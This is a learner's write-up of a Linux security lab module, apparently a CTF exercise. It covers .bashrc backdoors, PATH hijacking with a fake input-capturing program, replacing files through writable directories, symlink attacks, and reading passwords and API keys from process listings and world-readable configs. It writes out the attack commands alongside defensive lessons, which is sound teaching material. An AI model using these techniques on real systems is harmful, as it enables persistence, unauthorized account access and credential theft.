# Silly Shenanigans

This module explores common Linux security mistakes involving shell startup files, `PATH` hijacking, directory permissions, symbolic links, process arguments, and exposed configuration files.

## Challenges

| # | Challenge                  | Status      |
| - | -------------------------- | ----------- |
| 1 | Bashrc Backdoor            | ✅ Completed |
| 2 | Sniffing Input             | ✅ Completed |
| 3 | Overshared Directories     | ✅ Completed |
| 4 | Tricky Linking             | ✅ Completed |
| 5 | Sniffing Process Arguments | ✅ Completed |
| 6 | Snooping on Configurations | ✅ Completed |

---

## What I Learned

### 1. Bashrc Backdoor

**Status:** ✅ Completed

**Concepts:**

* Bash executes `.bashrc` when an interactive shell starts.
* A user's `.bashrc` can contain commands, environment variables, aliases, and other shell configuration.
* If another user can write to `.bashrc`, they can insert commands that execute when the victim starts a shell.
* This can provide persistence or execute commands using the victim's permissions.
* `>>` appends content without destroying the existing file.

**Example attack:**

```bash
echo 'cat /flag > /tmp/stolen_flag' >> /home/zardus/.bashrc
/challenge/victim
cat /tmp/stolen_flag
```

**Important syntax:**

```bash
command >> file
```

`>>` appends output to a file, while `>` overwrites it.

**Security lesson:**

Shell startup files should never be writable by unauthorized users.

---

### 2. Sniffing Input

**Status:** ✅ Completed

**Concepts:**

* `PATH` determines where the shell searches for executable commands.
* Directories earlier in `PATH` are searched first.
* An attacker can create a malicious program with the same name as a legitimate command.
* If the attacker's directory appears first in `PATH`, the malicious command executes instead.
* A fake program can intercept sensitive input intended for the legitimate program.

**Create a fake command:**

```bash
mkdir -p /tmp/hijack
nano /tmp/hijack/flag_checker
```

Contents:

```bash
#!/bin/bash
echo "Type the flag"
cat
```

Make it executable:

```bash
chmod +x /tmp/hijack/flag_checker
```

Modify the victim's `PATH` through `.bashrc`:

```bash
export PATH=/tmp/hijack:$PATH
```

Then trigger the victim:

```bash
/challenge/victim
```

**Attack flow:**

```text
Victim runs flag_checker
        ↓
Shell searches PATH
        ↓
/tmp/hijack is searched first
        ↓
Fake flag_checker executes
        ↓
Victim enters sensitive information
        ↓
Fake program captures/displays the input
```

**Security lesson:**

Be careful about which directories appear in `PATH`, especially directories writable by other users.

---

### 3. Overshared Directories

**Status:** ✅ Completed

**Concepts:**

* File permissions and directory permissions control different things.
* A file may not be writable, but a writable parent directory can still allow an attacker to remove and replace that file.
* Write permission on a directory allows modification of its directory entries.
* World-writable home directories are dangerous.

Check permissions:

```bash
ls -ld /home/zardus
ls -l /home/zardus/.bashrc
```

Even though `.bashrc` was protected, `/home/zardus` was writable.

The existing file could therefore be removed:

```bash
rm /home/zardus/.bashrc
```

A malicious replacement could then be created:

```bash
echo 'export PATH=/tmp/hijack:$PATH' > /home/zardus/.bashrc
```

This allowed the previous `PATH` hijacking attack to be reused.

**Important distinction:**

```text
Writable file
    → modify the contents of that file

Writable directory
    → create files
    → remove files
    → rename files
    → potentially replace protected files
```

**Security lesson:**

Protecting an individual file is not sufficient if its parent directory is writable by an attacker.

---

### 4. Tricky Linking

**Status:** ✅ Completed

**Concepts:**

* Symbolic links point one pathname to another file.
* Programs may unknowingly follow symbolic links when reading or writing files.
* A writable shared directory can enable symbolic-link attacks.
* The sticky bit helps protect files inside shared writable directories.

Symbolic-link syntax:

```bash
ln -s TARGET LINK_NAME
```

In the challenge:

```bash
rm /tmp/collab/evil-commands.txt
ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
```

Check the link:

```bash
ls -l /tmp/collab/evil-commands.txt
```

Conceptually:

```text
/tmp/collab/evil-commands.txt
            ↓
       symbolic link
            ↓
/home/zardus/.bashrc
```

When Zardus executed:

```bash
echo "cat /flag" >> /tmp/collab/evil-commands.txt
```

the shell followed the symbolic link and actually appended the command to:

```text
/home/zardus/.bashrc
```

The next victim login caused:

```bash
cat /flag
```

to execute.

**Sticky bit:**

A shared directory such as `/tmp` commonly has permissions resembling:

```text
drwxrwxrwt
```

The final `t` represents the **sticky bit**.

It prevents users from deleting or renaming files belonging to other users inside the shared directory.

**Security lesson:**

World-writable shared directories without proper protections can enable file replacement and symbolic-link attacks.

---

### 5. Sniffing Process Arguments

**Status:** ✅ Completed

**Concepts:**

* `ps aux` displays running processes.
* The process listing can include command-line arguments.
* Sensitive information passed directly as an argument may therefore become visible to other users.
* Passwords, tokens, and API keys should generally not be passed insecurely through command-line arguments.

View processes:

```bash
ps aux
```

A process exposed Zardus's password through an argument similar to:

```text
--pass pw_XXXXXXXXXX
```

The leaked password could then be used with:

```bash
su zardus
```

After authenticating as Zardus:

```bash
sudo cat /flag
```

retrieved the flag because Zardus was authorized to execute that command with `sudo`.

**Attack flow:**

```text
Password passed as command argument
            ↓
         ps aux
            ↓
Another user sees the password
            ↓
         su zardus
            ↓
Attacker gains access to victim account
```

**Security lesson:**

Command-line arguments are not an appropriate place for secrets when other users can inspect the process table.

---

### 6. Snooping on Configurations

**Status:** ✅ Completed

**Concepts:**

* Configuration files may contain sensitive information such as API keys, passwords, and tokens.
* A file does not need to be writable to create a security vulnerability.
* World-readable configuration files can expose credentials.
* `.bashrc` is commonly readable unless its permissions are changed.

Zardus stored an API key in:

```text
/home/zardus/.bashrc
```

The configuration could be inspected with:

```bash
cat /home/zardus/.bashrc
```

or searched directly:

```bash
grep FLAG_GETTER_API_KEY /home/zardus/.bashrc
```

The result contained something similar to:

```text
FLAG_GETTER_API_KEY=sk-XXXXXXXX
```

The stolen key could then be supplied to:

```bash
flag_getter --key sk-XXXXXXXX
```

**Security lesson:**

Sensitive credentials should not be stored in files that unauthorized users can read.

---

## Important Commands

| Command             | Purpose                                                |
| ------------------- | ------------------------------------------------------ |
| `cat file`          | Display a file                                         |
| `grep PATTERN file` | Search a file for matching text                        |
| `ls -l file`        | Display file permissions and ownership                 |
| `ls -ld directory`  | Display directory permissions                          |
| `chmod +x file`     | Make a file executable                                 |
| `rm file`           | Remove a file                                          |
| `mkdir -p dir`      | Create a directory                                     |
| `ln -s TARGET LINK` | Create a symbolic link                                 |
| `ps aux`            | Display running processes and arguments                |
| `su USER`           | Switch to another user                                 |
| `sudo command`      | Execute an authorized command with elevated privileges |
| `>`                 | Redirect and overwrite                                 |
| `>>`                | Redirect and append                                    |
| `$PATH`             | List directories searched for commands                 |

---

## Key Security Lessons

1. **Protect shell startup files.**
   Writable `.bashrc` files can allow persistent command execution.

2. **Protect `PATH`.**
   Writable directories appearing early in `PATH` can enable command hijacking.

3. **Directory permissions matter.**
   A protected file can still be vulnerable if attackers can modify its parent directory.

4. **Be careful with symbolic links.**
   Programs writing to predictable files in shared directories may follow attacker-controlled links.

5. **Use the sticky bit for shared directories.**
   It helps prevent users from deleting or replacing files belonging to other users.

6. **Do not expose secrets in process arguments.**
   Commands such as `ps aux` may reveal them.

7. **Protect configuration files.**
   API keys, passwords, and tokens should not be stored in world-readable files.

---

## Summary

The **Silly Shenanigans** module demonstrated how seemingly small Linux configuration and permission mistakes can become serious security vulnerabilities.

The major attack techniques covered were:

```text
.bashrc modification
        ↓
Startup command execution

PATH manipulation
        ↓
Command hijacking
        ↓
Input interception

Writable directory
        ↓
Protected file replacement

World-writable shared directory
        ↓
Symbolic-link attack

Sensitive command argument
        ↓
Process information leak

World-readable configuration
        ↓
Credential/API-key theft
```

The central lesson is that Linux security depends on more than simply protecting `/flag` or another sensitive file. **Permissions, directory ownership, environment variables, process information, symbolic links, and configuration files all affect the security of the system.**
